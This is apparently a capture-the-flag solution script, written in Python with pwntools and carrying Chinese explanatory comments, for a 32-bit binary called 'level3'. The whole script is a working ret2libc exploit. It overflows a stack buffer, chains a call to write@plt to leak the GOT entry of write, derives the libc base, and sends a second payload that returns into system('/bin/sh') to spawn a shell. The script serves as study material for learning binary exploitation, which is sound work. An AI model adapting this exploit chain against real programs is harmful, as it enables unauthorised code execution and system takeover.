from pwn import *

pad = 0x88 + 0x4

io = process("./level3")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF("./level3")

io.recvline()

#注意这道题的write函数在执行溢出位置前就已经使用，也就意味着如果我们想要获取程序运行过程中的write函数的地址，我们需要先让其在我们真正攻击之前利用write函数在.plt表中的位置泄露出write函数在.got中的地址(也就是write函数的真实地址)，然后在利用偏移计算system函数的地址，进而劫持程序流

vul_fun_addr = elf.symbols["vulnerable_function"]
print(hex(vul_fun_addr))

write_plt = elf.symbols["write"]
#这里使用plt表项是因为在IDA的左栏中可以清楚的看到.plt表项中有write函数，调用该函数实现泄漏目的
write_got = elf.got["write"]

payload1 = cyclic(pad) + p32(write_plt) + p32(vul_fun_addr) + ( p32(1) + p32(write_got) + p32(4) )
#套娃操作，使用的是两个函数的简洁传参方式，具体可见ROP笔记；其中后面的括号部分是write函数所需的3个参数：
#   p32(1)是标准输出编号，p32(write_got)是我们需要输出的内容，p32(4)是控制其向我们传4个字节的大小
#由于我们的溢出是从低地址到高地址，所以逆序将参数压栈在这里就是顺序写入即可！！！

io.sendline(payload1)

write_addr_byte = io.recvline()
print(write_addr_byte)

write_addr = write_addr_byte[0:4]
print(write_addr)
write_addr = u32(write_addr)
print(hex(write_addr))
#将字节型数据转为十进制数
#p32中的p是pack即打包的意思；u32中的u是unpack是p32的逆操作

libc_base = write_addr - libc.symbols["write"]
print(hex(libc_base))
#计算偏移量

sys_addr = libc.symbols["system"] + libc_base
binsh_addr = next(libc.search(b'/bin/sh')) + libc_base
print(hex(sys_addr))
print(hex(binsh_addr))
#通过偏移得到system以及/bin/sh字符串的真实地址

payload2 = cyclic(pad) + p32(sys_addr) + b"deed" + p32(binsh_addr)

io.sendline(payload2)

io.interactive()
